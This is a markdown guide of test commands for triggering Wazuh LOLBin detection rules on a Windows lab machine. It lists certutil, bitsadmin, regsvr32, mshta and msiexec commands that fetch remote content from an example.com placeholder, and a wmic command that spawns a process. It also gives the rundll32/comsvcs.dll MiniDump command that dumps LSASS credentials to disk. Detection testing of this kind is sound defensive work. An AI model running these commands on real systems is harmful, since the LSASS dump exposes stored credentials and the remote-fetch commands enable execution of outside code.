# LOLBins detection tests

Commands to trigger each LOLBin rule on a Windows lab machine. **Run them from CMD as Administrator, not PowerShell**: in the lab, PowerShell blocked these tools with Access Denied.

The download-style commands point at `example.com` so nothing malicious is fetched. Filter the Wazuh dashboard by the rule ID shown. Lab results: 8 of 13 LOLBin rules were verified; certutil, regsvr32 and wmic were unavailable on the test host.

### Rule 100500: Certutil download abuse

```text
# Run in CMD as Administrator:
certutil.exe -urlcache -split -f http://example.com C:\Windows\Temp\test.txt
# Check dashboard: rule.id: 100500
# Expected: Alert - Certutil abused for file download or encoding
# Note: certutil was blocked by system policy on the lab host, so this rule was not verified
```

### Rule 100501: Regsvr32 remote script

```text
# Run in CMD as Administrator:
regsvr32.exe /s /i:http://example.com/test.sct scrobj.dll
# Check dashboard: rule.id: 100501
# Expected: Alert - Regsvr32 executing remote or suspicious script
# Note: regsvr32 was blocked by system policy on the lab host, so this rule was not verified
```

### Rule 100502: Mshta remote script

```text
# Run in CMD as Administrator:
mshta.exe http://example.com/test.hta
# Check dashboard: rule.id: 100502
# Expected: Alert - Mshta executing remote or script content
```

### Rule 100503: Rundll32 LSASS dump

> **Warning:** this command writes a real memory dump of LSASS, which contains credentials, to disk. Run it only inside an isolated lab VM and delete `lsass.dmp` afterwards.

```text
# First get LSASS PID:
tasklist | findstr lsass
# Then run (replace 672 with actual LSASS PID):
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 672 C:\Windows\Temp\lsass.dmp full
# Check dashboard: rule.id: 100503
# Expected: Alert - Rundll32 abused for malicious execution or LSASS dump
# Note: Level 13 — higher than other LOLBin rules due to severity
```

### Rule 100504: Bitsadmin file download

```text
# Run in CMD as Administrator:
bitsadmin /transfer myJob /download /priority normal http://example.com C:\Windows\Temp\test.txt
# Check dashboard: rule.id: 100504
# Expected: Alert - Bitsadmin used for file download
```

### Rule 100505: WMIC suspicious command

```text
# Run in CMD as Administrator (on machines where wmic exists):
wmic process call create "cmd.exe /c whoami"
# Check dashboard: rule.id: 100505
# Expected: Alert - WMIC executing suspicious command
# Note: wmic.exe is removed from newer Windows versions, so this rule was not verified on the lab host
```

### Rule 100506: Msiexec remote package

```text
# Run in CMD as Administrator:
msiexec.exe /q /i http://example.com/test.msi
# Check dashboard: rule.id: 100506
# Expected: Alert - Msiexec executing remote or silent package
```

### Rule 100511 and 100521: Multiple rundll32 LSASS dumps

> **Warning:** same as rule 100503: each run writes a real LSASS dump. Lab VM only, and delete the dump files afterwards.

```text
# Run in CMD as Administrator — repeat 3 times with 3 second gaps:
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 672 C:\Windows\Temp\lsass.dmp full
# Run 3 times manually with few seconds between each
# Check dashboard: rule.id: 100511 then 100521
# Expected chain:
# 100503 fires (Level 13) — single dump detected
# 100511 fires (Level 14) — multiple dumps detected
# 100521 fires (Level 15) — CRITICAL: all passwords at risk
```

### Rule 100512 and 100522: LOLBin persistent abuse

```text
# Run in CMD as Administrator — run mshta 6 times with 3 second gaps:
mshta.exe http://example.com/test.hta
# Run 6 times with 3 second gap between each
# Then run bitsadmin 6 more times within same 3 minute window:
bitsadmin /transfer myJob /download /priority normal http://example.com C:\Windows\Temp\t.txt
# Check dashboard: rule.id: 100512 then 100522
# Expected chain:
# 100502/100504 fires (Level 12) — individual LOLBin detected
# 100512 fires (Level 14) — persistent LOLBin abuse (5+ times)
# 100522 fires (Level 15) — CRITICAL: coordinated attack confirmed
```
